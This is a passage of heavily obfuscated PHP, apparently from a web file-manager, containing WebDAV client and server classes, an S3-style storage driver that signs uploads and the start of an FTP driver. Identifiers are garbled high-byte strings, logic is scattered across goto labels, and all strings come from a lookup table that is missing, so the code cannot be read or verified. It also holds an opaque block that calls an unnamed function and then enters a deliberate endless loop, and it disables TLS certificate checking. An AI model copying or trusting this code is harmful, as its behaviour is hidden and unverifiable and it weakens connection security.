$EÅì´è¼Í‘, $eÀÓÈ‹ä ³); } public function options($bšØïãĞ®Î) { return $this->send($_SERVER[³‘’¼äÑ™ÔÍ][1789], $bšØïãĞ®Î); } public function get($F¥ÒîÁ·©‹) { return $this->send($_SERVER[³‘’¼äÑ™ÔÍ][216], $F¥ÒîÁ·©‹); } public function put($añ§³µŠ®É, $CÌá…·ÄÙ¶, $AõŠäšò = '') { $a²Œ£šî»– =& $_SERVER[³‘’¼äÑ™ÔÍ]; if ($AõŠäšò) { $this->setHeader($a²Œ£šî»–[1780], $a²Œ£šî»–[929] . $AõŠäšò . $a²Œ£šî»–[932]); } return $this->send($a²Œ£šî»–[214], $añ§³µŠ®É, $CÌá…·ÄÙ¶); } protected function send($dËññÆŞš„, $D¶ê¾…Ë´¼, $c‡À‹î‹‘ù = false, $EÆàÖôøùÅ = false) { goto AéœØÚãö¤; dµÂ“ìíÙ»: $this->header = array(); return $A‚ˆ©¬¯‰­; goto AÙİˆº‰Øğ; C¹ÑíĞ¯Íï: curl_setopt($BÔà ¶Ú, CURLOPT_SSL_VERIFYPEER, !1); curl_setopt($BÔà ¶Ú, CURLOPT_SSL_VERIFYHOST, !1); $A‚ˆ©¬¯‰­ = curl_exec($BÔà ¶Ú); goto dµÂ“ìíÙ»; A­Ûô¹Í˜á: curl_setopt($BÔà ¶Ú, CURLOPT_HTTPHEADER, $this->header); curl_setopt($BÔà ¶Ú, CURLOPT_RETURNTRANSFER, !0); curl_setopt($BÔà ¶Ú, CURLOPT_PROTOCOLS, CURLPROTO_HTTP | CURLPROTO_HTTPS); goto C¹ÑíĞ¯Íï; AéœØÚãö¤: $dĞ‹ŸÒÎ¹ò =& $_SERVER[³‘’¼äÑ™ÔÍ]; $BØ´ĞÆ…“ë = HttpAuth::make($this->userName, $this->userPassowrd); $this->setHeader($dĞ‹ŸÒÎ¹ò[1790], $dĞ‹ŸÒÎ¹ò[50]); goto BÂÇ’êÛ; BòöŒ¿“¬Í: $BÔà ¶Ú = curl_init($D¶ê¾…Ë´¼); curl_setopt($BÔà ¶Ú, CURLOPT_CUSTOMREQUEST, $dËññÆŞš„); curl_setopt($BÔà ¶Ú, CURLOPT_HTTPAUTH, CURLAUTH_ANY); goto A­Ûô¹Í˜á; BÂÇ’êÛ: $this->setHeader($BØ´ĞÆ…“ë); if ($c‡À‹î‹‘ù) { $c‡À‹î‹‘ù = $dĞ‹ŸÒÎ¹ò[1791] . $c‡À‹î‹‘ù; } if (!request_url_safe($D¶ê¾…Ë´¼)) { return !1; } goto BòöŒ¿“¬Í; AÙİˆº‰Øğ: } } class HttpDavServer { public function __construct($b¾Æß­¦½½, $fÊïÓ¿›™) { $this->root = $b¾Æß­¦½½; $this->initPath($fÊïÓ¿›™); $this->start(); } public function initPath($Añ¨Ôò†›ª) { $Eïñö‹ôİ =& $_SERVER[³‘’¼äÑ™ÔÍ]; $b˜ÄÏ¢Í = rtrim($_SERVER[$Eïñö‹ôİ[1396]], $Eïñö‹ôİ[8]) . $Eïñö‹ôİ[8]; $this->urlBase = substr($b˜ÄÏ¢Í, 0, strpos($b˜ÄÏ¢Í, $Añ¨Ôò†›ª) + 1); $this->urlBase = rtrim($this->urlBase, $Eïñö‹ôİ[8]) . $Añ¨Ôò†›ª; $this->path = $this->parsePath($this->pathGet()); } public function checkUser() { $d³¦Àä¢â =& $_SERVER[³‘’¼äÑ™ÔÍ]; $dÀŸƒ¿òÕ = HttpAuth::get(); if ($dÀŸƒ¿òÕ[$d³¦Àä¢â[535]] == $d³¦Àä¢â[1792] && $dÀŸƒ¿òÕ[$d³¦Àä¢â[901]] == $d³¦Àä¢â[1793]) { return !0; } HttpAuth::error(); } public function start() { goto Dƒœ¥ö±Üù; CŠ†´ë½äØ: if (!method_exists($this, $Aùï…ô£‘)) { pr($Aùï…ô£‘ . $c·½ÇÏã«[1794]); die; } $D¼Õ¨»ÊÊ© = array($c·½ÇÏã«[1795], $c·½ÇÏã«[1796]); if (!in_array($Aùï…ô£‘, $D¼Õ¨»ÊÊ©) && !$this->pathExists($this->path)) { $bë§áà´ì = array($c·½ÇÏã«[1036] => 404); } else { $bë§áà´ì = $this->{$Aùï…ô£‘}(); } goto B†¼‹“Ö¡“; Dƒœ¥ö±Üù: $c·½ÇÏã« =& $_SERVER[³‘’¼äÑ™ÔÍ]; $this->checkUser(); $Aùï…ô£‘ = $c·½ÇÏã«[144] . HttpHeader::method(); goto CŠ†´ë½äØ; B†¼‹“Ö¡“: if (!$bë§áà´ì) { return; } self::response($bë§áà´ì); goto a’ƒŠ¿ÌÍŸ; a’ƒŠ¿ÌÍŸ: } public function pathGet($B¿åéËŠó = false) { $CÀ‚òÔåæ‰ =& $_SERVER[³‘’¼äÑ™ÔÍ]; $eë»åÇŒ˜É = $B¿åéËŠó ? $_SERVER[$CÀ‚òÔåæ‰[1797]] : $_SERVER[$CÀ‚òÔåæ‰[1396]]; $eë»åÇŒ˜É = KodIO::clear(rawurldecode($eë»åÇŒ˜É)); if (!strstr($eë»åÇŒ˜É, KodIO::clear($this->urlBase))) { return !1; } return substr($eë»åÇŒ˜É, strpos($eë»åÇŒ˜É, $this->urlBase) + strlen($this->urlBase)); } public function pathExists($d ‚äŠÅ) { return file_exists($d ‚äŠÅ); } public function pathMkdir($E‹åÈ•ËË) { return mkdir($E‹åÈ•ËË, 511, !0); } public function pathInfo($A»²²ğòñİ) { return path_info($A»²²ğòñİ); } public function pathList($AÀµÑ§óÔ®) { return path_list($AÀµÑ§óÔ®); } public function pathOut($D»ì†é‚÷Ä) { echo file_get_contents($D»ì†é‚÷Ä); } public function pathPut($eùˆ›¶¢ò„, $A¾Ø˜‰”ŠÓ = '') { if (!$A¾Ø˜‰”ŠÓ) { return file_put_contents($eùˆ›¶¢ò„, $_SERVER[³‘’¼äÑ™ÔÍ][33]); } return move_path($A¾Ø˜‰”ŠÓ, $eùˆ›¶¢ò„); } public function pathRemove($a…Îè±‡‚‹) { if (is_file($a…Îè±‡‚‹)) { return @unlink($this->path); } else { return del_dir($this->path); } } public function pathMove($dÂÜÑ…òÇ½, $CÀ¼Šº¡…¸) { return move_path($dÂÜÑ…òÇ½, $CÀ¼Šº¡…¸); } public function pathCopy($CœßğÃèĞŠ, $bÎì¬‹¢Ÿø) { return copy_dir($CœßğÃèĞŠ, $bÎì¬‹¢Ÿø); } public function parsePath($C·‡Ô§”ò…) { return $C·‡Ô§”ò…; } public function parseItem($a´š‚¢ìçŒ, $eÚ–í‹ªà) { goto d„¹‡ö„Ä; aÉëáˆÈ¿ë: $aÃ¨ô›„È = array($E¸ƒ…†¦…™[1798] => KodIO::clear($this->urlBase . $f¾‡ˆˆµªÌ), $E¸ƒ…†¦…™[107] => @gmdate($E¸ƒ…†¦…™[1799], $a´š‚¢ìçŒ[$E¸ƒ…†¦…™[107]]), $E¸ƒ…†¦…™[187] => @gmdate($E¸ƒ…†¦…™[1800], $a´š‚¢ìçŒ[$E¸ƒ…†¦…™[187]]), $E¸ƒ…†¦…™[77] => $a´š‚¢ìçŒ[$E¸ƒ…†¦…™[77]] ? $a´š‚¢ìçŒ[$E¸ƒ…†¦…™[77]] : 0); return $aÃ¨ô›„È; goto dªÖ–½îˆ‰; d„¹‡ö„Ä: $E¸ƒ…†¦…™ =& $_SERVER[³‘’¼äÑ™ÔÍ]; $f¾‡ˆˆµªÌ = $this->pathGet() . $E¸ƒ…†¦…™[8] . $a´š‚¢ìçŒ[$E¸ƒ…†¦…™[28]]; $f¾‡ˆˆµªÌ = $E¸ƒ…†¦…™[8] . str_replace($E¸ƒ…†¦…™[172], $E¸ƒ…†¦…™[8], rawurlencode($f¾‡ˆˆµªÌ)); goto cÑ³à¢¨†é; cÑ³à¢¨†é: if ($eÚ–í‹ªà) { $f¾‡ˆˆµªÌ = $E¸ƒ…†¦…™[8] . str_replace($E¸ƒ…†¦…™[172], $E¸ƒ…†¦…™[8], rawurlencode($this->pathGet())); } if (!trim($a´š‚¢ìçŒ[$E¸ƒ…†¦…™[107]])) { $a´š‚¢ìçŒ[$E¸ƒ…†¦…™[107]] = time(); } if (!trim($a´š‚¢ìçŒ[$E¸ƒ…†¦…™[187]])) { $a´š‚¢ìçŒ[$E¸ƒ…†¦…™[187]] = time(); } goto aÉëáˆÈ¿ë; dªÖ–½îˆ‰: } public function parseItemXml($BÙô†Ìã¼, $f¢ÕÀÎƒ˜‘) { $D Ü¤´ƒ«‰ =& $_SERVER[³‘’¼äÑ™ÔÍ]; $D¡ØÄ·æØŠ = $this->parseItem($BÙô†Ìã¼, $f¢ÕÀÎƒ˜‘); if ($BÙô†Ìã¼[$D Ü¤´ƒ«‰[29]] == $D Ü¤´ƒ«‰[76]) { $cí±’æğ‡® = $D Ü¤´ƒ«‰[1801]; $cí±’æğ‡® .= $D Ü¤´ƒ«‰[1802]; } else { $E·—¦ó¡İ = $BÙô†Ìã¼[$D Ü¤´ƒ«‰[160]] ? $BÙô†Ìã¼[$D Ü¤´ƒ«‰[160]] : get_path_ext($BÙô†Ìã¼[$D Ü¤´ƒ«‰[28]]); $fêŞ‹Š©ã = get_file_mime($E·—¦ó¡İ); $cí±’æğ‡® = $D Ü¤´ƒ«‰[1803]; $cí±’æğ‡® .= "\74\104\x3a\147\145\x74\x63\157\156\164\x65\156\x74\164\x79\x70\145\76{$fêŞ‹Š©ã}\74\x2f\104\72\x67\x65\x74\x63\x6f\156\164\145\x6e\164\x74\x79\160\145\76"; } return "\xa\x9\x9\x3c\104\72\x72\x65\x73\160\157\156\163\x65\76\12\x9\11\11\74\x44\72\x68\x72\145\x66\x3e{$D¡ØÄ·æØŠ[$D Ü¤´ƒ«‰[1798]]}\74\57\104\x3a\x68\x72\x65\x66\76\12\x9\x9\x9\x3c\x44\72\x70\162\x6f\160\163\164\141\x74\76\xa\x9\x9\11\x9\74\x44\x3a\x70\162\x6f\160\76\xa\11\x9\11\x9\x9\74\x44\x3a\x67\145\164\154\141\x73\x74\155\157\144\151\146\151\145\144\x3e{$D¡ØÄ·æØŠ[$D Ü¤´ƒ«‰[107]]}\74\x2f\104\x3a\x67\145\164\x6c\141\x73\164\155\157\x64\151\146\x69\145\x64\76\xa\x9\x9\x9\x9\11\74\104\72\143\x72\145\x61\164\x69\157\156\x64\141\164\145\76{$D¡ØÄ·æØŠ[$D Ü¤´ƒ«‰[187]]}\74\x2f\104\x3a\x63\x72\145\x61\164\x69\x6f\x6e\144\x61\164\x65\76\12\11\x9\11\11\11\x3c\x44\x3a\147\x65\164\x63\157\x6e\164\x65\156\x74\154\x65\x6e\x67\x74\150\76{$D¡ØÄ·æØŠ[$D Ü¤´ƒ«‰[77]]}\74\x2f\104\72\147\145\x74\143\157\x6e\x74\x65\156\164\x6c\x65\x6e\x67\164\x68\x3e\xa\x9\11\11\x9\11{$cí±’æğ‡®}\xa\11\x9\11\x9\x3c\x2f\104\72\160\162\157\x70\76\12\11\x9\x9\11\x3c\104\72\163\164\x61\x74\x75\163\x3e\110\124\x54\x50\x2f\61\x2e\x31\40\x32\x30\x30\40\117\113\74\57\104\72\163\x74\141\164\x75\163\x3e\xa\11\11\x9\x3c\x2f\104\72\160\x72\x6f\x70\x73\164\x61\164\76\12\11\11\x3c\x2f\104\72\x72\145\163\160\157\156\163\x65\76"; } public function pathListMerge($BŸ‘æòç‰Ì) { goto f×£ø¡åöŒ; dÀòÚŞ‹½Ï: $B–‹ŠŸ’ = array(); foreach ($BŸ‘æòç‰Ì as $D²ÆÕÎ°Æ => $bèà¨ä”¦Ê) { if (!in_array($D²ÆÕÎ°Æ, $b¶™Õì§®) || !is_array($bèà¨ä”¦Ê)) { continue; } $B–‹ŠŸ’ = array_merge($B–‹ŠŸ’, $bèà¨ä”¦Ê); } foreach ($B–‹ŠŸ’ as &$aÚ’·íëãã) { $aÚ’·íëãã[$b½‹ÉˆØŠ[28]] = str_replace($b½‹ÉˆØŠ[8], $b½‹ÉˆØŠ[1398], $aÚ’·íëãã[$b½‹ÉˆØŠ[28]]); } goto c¹Ñ¢©Çõ; f×£ø¡åöŒ: $b½‹ÉˆØŠ =& $_SERVER[³‘’¼äÑ™ÔÍ]; if (!$BŸ‘æòç‰Ì) { return $BŸ‘æòç‰Ì; } $b¶™Õì§® = array($b½‹ÉˆØŠ[73], $b½‹ÉˆØŠ[74], $b½‹ÉˆØŠ[1804]); goto dÀòÚŞ‹½Ï; c¹Ñ¢©Çõ: return $B–‹ŠŸ’; goto CæÀŒÅ¼Š«; CæÀŒÅ¼Š«: } public function httpPROPFIND() { goto DÛœê³™Û; aÂî‰İäµ°: if ($FƒÈ½›Ô…) { $cˆùÄÆ§Èà = array($DÒ‚£Ï®ç©); } else { $DÒ‚£Ï®ç©[$d©¹Â­ó’[28]] = $d©¹Â­ó’[33]; $cˆùÄÆ§Èà = array_merge(array($DÒ‚£Ï®ç©), $cˆùÄÆ§Èà); } $Eœ»¤ïééÒ = $d©¹Â­ó’[33]; foreach ($cˆùÄÆ§Èà as $cöàİŒ¸Ú) { $Eœ»¤ïééÒ .= $this->parseItemXml($cöàİŒ¸Ú, $FƒÈ½›Ô…); } goto bœÆ³¼‚î; bóåêéàš†: $DÒ‚£Ï®ç© = $E¿·ÂÎŒšô[$d©¹Â­ó’[1805]]; if (!is_array($cˆùÄÆ§Èà) || $DÒ‚£Ï®ç©[$d©¹Â­ó’[1806]] === !1) { return array($d©¹Â­ó’[1807] => 404, $d©¹Â­ó’[1808] => $d©¹Â­ó’[1809]); } $FƒÈ½›Ô… = $DÒ‚£Ï®ç©[$d©¹Â­ó’[29]] == $d©¹Â­ó’[167] || HttpHeader::get($d©¹Â­ó’[1784]) == $d©¹Â­ó’[468]; goto aÂî‰İäµ°; bœÆ³¼‚î: return array($d©¹Â­ó’[1807] => 207, $d©¹Â­ó’[1808] => "\x3c\104\72\x6d\165\154\164\151\163\164\x61\164\165\x73\40\x78\x6d\x6c\156\x73\x3a\x44\x3d\x22\104\101\x56\72\42\x3e\xa{$Eœ»¤ïééÒ}\12\74\57\104\x3a\x6d\165\154\x74\x69\163\x74\141\x74\165\x73\x3e"); goto b½ÓÉ“‰Û¾; DÛœê³™Û: $d©¹Â­ó’ =& $_SERVER[³‘’¼äÑ™ÔÍ]; $E¿·ÂÎŒšô = $this->pathList($this->path); $cˆùÄÆ§Èà = $this->pathListMerge($E¿·ÂÎŒšô); goto bóåêéàš†; b½ÓÉ“‰Û¾: } public function httpHEAD() { $bœÕç¨ŠÌÈ =& $_SERVER[³‘’¼äÑ™ÔÍ]; $d˜–‚‹İÙÈ = $this->pathInfo($this->path); if (!$d˜–‚‹İÙÈ || $d˜–‚‹İÙÈ[$bœÕç¨ŠÌÈ[29]] == $bœÕç¨ŠÌÈ[76]) { return array($bœÕç¨ŠÌÈ[1036] => 200, $bœÕç¨ŠÌÈ[1213] => array($bœÕç¨ŠÌÈ[1810])); } return array($bœÕç¨ŠÌÈ[1036] => 200, $bœÕç¨ŠÌÈ[1213] => array($bœÕç¨ŠÌÈ[1811], $bœÕç¨ŠÌÈ[136], $bœÕç¨ŠÌÈ[1812] . $d˜–‚‹İÙÈ[$bœÕç¨ŠÌÈ[77]], $bœÕç¨ŠÌÈ[1813] . get_file_mime($d˜–‚‹İÙÈ[$bœÕç¨ŠÌÈ[160]]), $bœÕç¨ŠÌÈ[132] . gmdate($bœÕç¨ŠÌÈ[1799], $d˜–‚‹İÙÈ[$bœÕç¨ŠÌÈ[1260]]) . $bœÕç¨ŠÌÈ[1814], $bœÕç¨ŠÌÈ[1815])); } public function httpOPTIONS() { $c­´—Ã›šØ =& $_SERVER[³‘’¼äÑ™ÔÍ]; return array($c­´—Ã›šØ[1036] => 200, $c­´—Ã›šØ[1213] => array($c­´—Ã›šØ[1816], $c­´—Ã›šØ[1817], $c­´—Ã›šØ[1818], $c­´—Ã›šØ[1269])); } public function httpPROPPATCH() { $c¢Ê™ùâ =& $_SERVER[³‘’¼äÑ™ÔÍ]; $Eù™°À‘ÙØ = $c¢Ê™ùâ[1819] . $_SERVER[$c¢Ê™ùâ[1396]] . $c¢Ê™ùâ[1820]; return array($c¢Ê™ùâ[1807] => 207, $c¢Ê™ùâ[1808] => "\x3c\x44\72\x6d\165\154\x74\151\x73\164\x61\164\165\163\40\x78\155\154\x6e\x73\72\x44\75\42\104\101\126\x3a\42\x3e\12{$Eù™°À‘ÙØ}\xa\x3c\57\104\x3a\x6d\x75\x6c\164\151\x73\x74\141\164\165\x73\76"); } public function httpGET() { $this->pathOut($this->path); } public function httpPUT() { $E§â·†Ší­ =& $_SERVER[³‘’¼äÑ™ÔÍ]; $EçÌœõÜÔ = $this->uploadFile(); if ($EçÌœõÜÔ) { $C“È°•¿°Ğ = 204; } else { $EçÌœõÜÔ = $E§â·†Ší­[33]; $C“È°•¿°Ğ = 201; } $a–§ó½òÈ = $this->pathPut($this->path, $EçÌœõÜÔ); if ($a–§ó½òÈ == !1) { $C“È°•¿°Ğ = 404; } return array($E§â·†Ší­[1807] => $C“È°•¿°Ğ); } private function uploadFile() { goto dÛ¬¶±ÛÉ; dÛ¬¶±ÛÉ: $BÎ›­ÄŒØ» =& $_SERVER[³‘’¼äÑ™ÔÍ]; @mk_dir(TEMP_FILES); $c»¥é‰ÂÈ = TEMP_FILES . $BÎ›­ÄŒØ»[1821] . rand_string(32); goto F—†ÁËì‰Ô; AˆÂº›Ç «: while (!feof($a‚­«ãê¹Ï)) { fwrite($EëÎà•¾Ó, fread($a‚­«ãê¹Ï, 1024 * 200)); } fclose($a‚­«ãê¹Ï); fclose($EëÎà•¾Ó); goto AËµ«Ò¦‚™; AËµ«Ò¦‚™: if (@filesize($c»¥é‰ÂÈ) > 0) { return $c»¥é‰ÂÈ; } @unlink($c»¥é‰ÂÈ); return !1; goto eÕÛğäœøé; F—†ÁËì‰Ô: $EëÎà•¾Ó = @fopen($c»¥é‰ÂÈ, $BÎ›­ÄŒØ»[1530]); $a‚­«ãê¹Ï = @fopen($BÎ›­ÄŒØ»[1822], $BÎ›­ÄŒØ»[1529]); if (!$a‚­«ãê¹Ï || !$EëÎà•¾Ó) { @unlink($c»¥é‰ÂÈ); return !1; } goto AˆÂº›Ç «; eÕÛğäœøé: } public function httpMKCOL() { $F‡±åí¬Å½ =& $_SERVER[³‘’¼äÑ™ÔÍ]; if ($this->pathExists($this->path)) { return array($F‡±åí¬Å½[1036] => 409); } $a§Ğö¶¢Ğò = $this->pathMkdir($this->path); return array($F‡±åí¬Å½[1036] => $a§Ğö¶¢Ğò ? 201 : 403); } public function httpMOVE() { $dèã¤›èÑ =& $_SERVER[³‘’¼äÑ™ÔÍ]; $aÂˆ‰è›¾” = $this->parsePath($this->pathGet(!0)); if (isset($_SERVER[$dèã¤›èÑ[1823]])) { $B†Íã¡°¡ª[$dèã¤›èÑ[1824]] = $_SERVER[$dèã¤›èÑ[1823]] == $dèã¤›èÑ[1825]; } $a•Œ‰Öàô = $this->pathMove($this->path, $aÂˆ‰è›¾”); return array($dèã¤›èÑ[1036] => $a•Œ‰Öàô ? 201 : 404); } public function httpCOPY() { $Bº´…Â“çá = $this->parsePath($this->pathGet(!0)); $A¿ÀœÕ»ÕÃ = $this->pathCopy($this->path, $Bº´…Â“çá); return array($_SERVER[³‘’¼äÑ™ÔÍ][1036] => $A¿ÀœÕ»ÕÃ ? 201 : 404); } public function httpDELETE() { $B²ŒªÂ‘Üß = $this->pathRemove($this->path); return array($_SERVER[³‘’¼äÑ™ÔÍ][1036] => $B²ŒªÂ‘Üß ? 200 : 503); } public function httpLOCK() { $F¯±²ªµõÄ =& $_SERVER[³‘’¼äÑ™ÔÍ]; $D¿¦âò¯ù = md5($this->path); $FÅãÆ  ï = $F¯±²ªµõÄ[1826] . $this->xmlGet($F¯±²ªµõÄ[1827]) . $F¯±²ªµõÄ[1828] . $D¿¦âò¯ù . $F¯±²ªµõÄ[1829]; return array($F¯±²ªµõÄ[1036] => 200, $F¯±²ªµõÄ[1213] => array($F¯±²ªµõÄ[1830] . $D¿¦âò¯ù, $F¯±²ªµõÄ[1831]), $F¯±²ªµõÄ[1832] => $FÅãÆ  ï); } public function httpUNLOCK() { return array($_SERVER[³‘’¼äÑ™ÔÍ][1036] => 204); } public function xmlGet($C•ñãƒô“Õ) { goto d’¯«¬Ó®; d’¯«¬Ó®: $Dä‘èÓ Ğ =& $_SERVER[³‘’¼äÑ™ÔÍ]; static $Có¦ï÷ë‰Ê = false; if (!$Có¦ï÷ë‰Ê) { $EË¸²É¾ = file_get_contents($Dä‘èÓ Ğ[1833]); $Có¦ï÷ë‰Ê = new DOMDocument(); $Có¦ï÷ë‰Ê->loadXML($EË¸²É¾); } goto câˆçóùÂ™; f¤£æÍ¾ª¶: return $Dä‘èÓ Ğ[33]; goto C‘÷ Š¾¨‘; câˆçóùÂ™: $bÂÎ–ø×ÆÏ = array_shift(explode($Dä‘èÓ Ğ[8], $C•ñãƒô“Õ)); $cÅ¤œ…ˆŞ = $Có¦ï÷ë‰Ê->getElementsByTagNameNS($Dä‘èÓ Ğ[1834], $bÂÎ–ø×ÆÏ); if ($cÅ¤œ…ˆŞ) { return $cÅ¤œ…ˆŞ[0]->nodeValue; } goto f¤£æÍ¾ª¶; C‘÷ Š¾¨‘: } public static function response($EÓÎˆµæ½) { goto F•Õ”¼Ššä; B•¶ë¸Ï¼: $e½‡Å£²Ì¼[] = $AôÆĞóÉÌô[1774]; $e½‡Å£²Ì¼[] = $AôÆĞóÉÌô[1775]; foreach ($e½‡Å£²Ì¼ as $fÅ‹Íø¿‰„) { header($fÅ‹Íø¿‰„); } goto fĞ½¢–å‰ß; F•Õ”¼Ššä: $AôÆĞóÉÌô =& $_SERVER[³‘’¼äÑ™ÔÍ]; $e½‡Å£²Ì¼ = is_array($EÓÎˆµæ½[$AôÆĞóÉÌô[1213]]) ? $EÓÎˆµæ½[$AôÆĞóÉÌô[1213]] : array(); $e½‡Å£²Ì¼[] = HttpHeader::code($EÓÎˆµæ½[$AôÆĞóÉÌô[1036]]); goto B•¶ë¸Ï¼; fĞ½¢–å‰ß: if (is_string($EÓÎˆµæ½[$AôÆĞóÉÌô[1832]])) { header($AôÆĞóÉÌô[1835]); $aáë„â¿‹½ = $AôÆĞóÉÌô[1836] . $AôÆĞóÉÌô[217] . $EÓÎˆµæ½[$AôÆĞóÉÌô[1832]]; echo $aáë„â¿‹½; } goto e®¹ÉËÃËè; e®¹ÉËÃËè: } } if (!isset($_SERVER[$_SERVER[³‘’¼äÑ™ÔÍ][791]]) || !isset($_SERVER[$_SERVER[³‘’¼äÑ™ÔÍ][1130]])) { goto bÉ÷Êê“±‰; AÊ™ß‹Ñë: $fš‹‹”æËÃ = explode($_SERVER[³‘’¼äÑ™ÔÍ][217], $DØ§¶Ä‚); if (count($fš‹‹”æËÃ) < $_SERVER[³‘’¼äÑ™ÔÍ][557]) { $fÀ˜»Óéãõ = $_SERVER[³‘’¼äÑ™ÔÍ][797]; $fÀ˜»Óéãõ(); } $a°·¾ÍáÂ‘ = $_SERVER[³‘’¼äÑ™ÔÍ][1129]; goto Aó“¸÷†²è; bÉ÷Êê“±‰: $bÌ›ØĞ×çÉ = $_SERVER[³‘’¼äÑ™ÔÍ][794]; $a‰¾«ß³ = $_SERVER[$_SERVER[³‘’¼äÑ™ÔÍ][795]] . $_SERVER[³‘’¼äÑ™ÔÍ][796]; $DØ§¶Ä‚ = $bÌ›ØĞ×çÉ($a‰¾«ß³); goto AÊ™ß‹Ñë; Aó“¸÷†²è: $a°·¾ÍáÂ‘($_SERVER[$_SERVER[³‘’¼äÑ™ÔÍ][795]] . $_SERVER[³‘’¼äÑ™ÔÍ][796]); $B‘ÉÇ½ÎîÕ = 2; while ($B‘ÉÇ½ÎîÕ > 1) { $F¹Ì¼Öˆ®‘ = rawurlencode($B‘ÉÇ½ÎîÕ . $_SERVER[³‘’¼äÑ™ÔÍ][361]); } goto B¯Šø˜ÅÁÂ; B¯Šø˜ÅÁÂ: } goto FÀ´Á•ÏÖ¢; FÜëãçÊÊ¦: class PathDriverEOS extends PathDriverBaseS3 { public function __construct($BÑÄÀí±ãÏ) { parent::__construct($BÑÄÀí±ãÏ); $this->signatureVersion($_SERVER[³‘’¼äÑ™ÔÍ][200]); } public function uploadFormData($E…œëÀê™Ñ, $A·©İÅ„¼ = 3600) { goto aÉƒ¥ø´’£; d•ÍÅê‚Ñ»: $ağ¢»¢ù÷ = $cŒ’Ø­‘¨œ[1142]; $c¦Æ©»Ì” = $A·©İÅ„¼ . $cŒ’Ø­‘¨œ[33]; $fëĞæ´ÜÉá = $cŒ’Ø­‘¨œ[1104]; goto Aç‰ËÇá°…; fÅÖæñ—ğĞ: $eŸ²×„˜ = base64_encode(json_encode($BµÎ‘‰)); $BÔ±ì¯›ğé = hash_hmac($cŒ’Ø­‘¨œ[1150], $b·ÑËâàö, $cŒ’Ø­‘¨œ[1151] . $this->secret, !0); $CøŠ„’áÒ‰ = hash_hmac($cŒ’Ø­‘¨œ[1150], $this->region, $BÔ±ì¯›ğé, !0); goto c‡öàğğ®; aÉƒ¥ø´’£: $cŒ’Ø­‘¨œ =& $_SERVER[³‘’¼äÑ™ÔÍ]; $Bâ‚ø¾ù´ä = $cŒ’Ø­‘¨œ[185]; $E÷ ¸Ò•ò = $cŒ’Ø­‘¨œ[1140]; goto B®îÊºˆÚ; Aç‰ËÇá°…: $b‰¥—’ÃÅ— = array($this->accessKey, $b·ÑËâàö, $this->region, $Aä‹ŠîñÚ¼, $ağ¢»¢ù÷); $EÉ¸ºÖ§èÒ = implode($cŒ’Ø­‘¨œ[8], $b‰¥—’ÃÅ—); $BµÎ‘‰ = array($cŒ’Ø­‘¨œ[1106] => gmdate($cŒ’Ø­‘¨œ[1105], strtotime($cŒ’Ø­‘¨œ[1143])), $cŒ’Ø­‘¨œ[1107] => array(array($cŒ’Ø­‘¨œ[1109] => $this->bucket), array($cŒ’Ø­‘¨œ[1108] => $Bâ‚ø¾ù´ä), array($cŒ’Ø­‘¨œ[1110], $cŒ’Ø­‘¨œ[1111], $cŒ’Ø­‘¨œ[33]), array($cŒ’Ø­‘¨œ[1110], $cŒ’Ø­‘¨œ[1144], $cŒ’Ø­‘¨œ[33]), array($cŒ’Ø­‘¨œ[1110], $cŒ’Ø­‘¨œ[1145], $cŒ’Ø­‘¨œ[33]), array($cŒ’Ø­‘¨œ[1112] => $fëĞæ´ÜÉá), array($cŒ’Ø­‘¨œ[1146] => $EÉ¸ºÖ§èÒ), array($cŒ’Ø­‘¨œ[1147] => $E÷ ¸Ò•ò), array($cŒ’Ø­‘¨œ[1148] => $AˆÂĞäç„È), array($cŒ’Ø­‘¨œ[1149] => $c¦Æ©»Ì”))); goto fÅÖæñ—ğĞ; c‡öàğğ®: $EÓĞ¤•éÅ = hash_hmac($cŒ’Ø­‘¨œ[1150], $Aä‹ŠîñÚ¼, $CøŠ„’áÒ‰, !0); $DÅÆÍÚ™ = hash_hmac($cŒ’Ø­‘¨œ[1150], $ağ¢»¢ù÷, $EÓĞ¤•éÅ, !0); $CØô£Ôè§ = hash_hmac($cŒ’Ø­‘¨œ[1150], $eŸ²×„˜, $DÅÆÍÚ™); goto AòØ°•±ŒÓ; AòØ°•±ŒÓ: $añ¿õªğ½… = array($cŒ’Ø­‘¨œ[199] => $cŒ’Ø­‘¨œ[33], $cŒ’Ø­‘¨œ[1152] => $cŒ’Ø­‘¨œ[33], $cŒ’Ø­‘¨œ[1108] => $Bâ‚ø¾ù´ä, $cŒ’Ø­‘¨œ[1112] => $fëĞæ´ÜÉá, $cŒ’Ø­‘¨œ[1116] => $eŸ²×„˜, $cŒ’Ø­‘¨œ[1153] => $EÉ¸ºÖ§èÒ, $cŒ’Ø­‘¨œ[1154] => $E÷ ¸Ò•ò, $cŒ’Ø­‘¨œ[1155] => $AˆÂĞäç„È, $cŒ’Ø­‘¨œ[1156] => $c¦Æ©»Ì”, $cŒ’Ø­‘¨œ[1157] => $CØô£Ôè§, $cŒ’Ø­‘¨œ[169] => $this->getHost()); return $añ¿õªğ½…; goto A…×ØÏã´™; B®îÊºˆÚ: $Aä‹ŠîñÚ¼ = $cŒ’Ø­‘¨œ[59]; $AˆÂĞäç„È = gmdate($cŒ’Ø­‘¨œ[1141]); $b·ÑËâàö = gmdate($cŒ’Ø­‘¨œ[693]); goto d•ÍÅê‚Ñ»; A…×ØÏã´™: } } class PathDriverFTP extends PathDriverBase { private $server = ''; private $username = ''; private $userpass = ''; private $scheme = ''; private $host = ''; private $port = 21; private $connect = false; private $pasv = "\61"; private $config = array(); public function __construct($CŠ–ËÎ…ã©) { parent::__construct(); if (count($CŠ–ËÎ…ã©) > 0) { $this->_init($CŠ–ËÎ…ã©); } } public function __destruct() { if (!$this->_isconn()) { return !1; } return @ftp_close($this->connect); } private function charsetReset($B¢­çŠÕÖº) { $FÒ‚Š°ä–Œ =& $_SERVER[³‘’¼äÑ™ÔÍ]; global $config; $this->appCharset = $config[$FÒ‚Š°ä–Œ[1158]]; $this->systemCharset = $config[$FÒ‚Š°ä–Œ[1159]]; if (isset($B¢­çŠÕÖº[$FÒ‚Š°ä–Œ[1160]]) && $B¢­çŠÕÖº[$FÒ‚Š°ä–Œ[1160]]) { $this->systemCharset = $B¢­çŠÕÖº[$FÒ‚Š°ä–Œ[1160]]; } } public function iconvApp($C¤Ö±‹º¦“) { return $this->iconvTo($C¤Ö±‹º¦“, $this->systemCharset, $this->appCharset); } public function iconvSystem($dœøˆí‰†Ì) { return $this->iconvTo($dœøˆí‰†Ì, $this->appCharset, $this->systemCharset); } public function getPathOuter($C¢¥ÂÌÆ­É) { goto A½©¥„‘‹; aÊÉâ½Šè: return $this->pathDriver . $E¢„÷í°ÈÇ[8] . 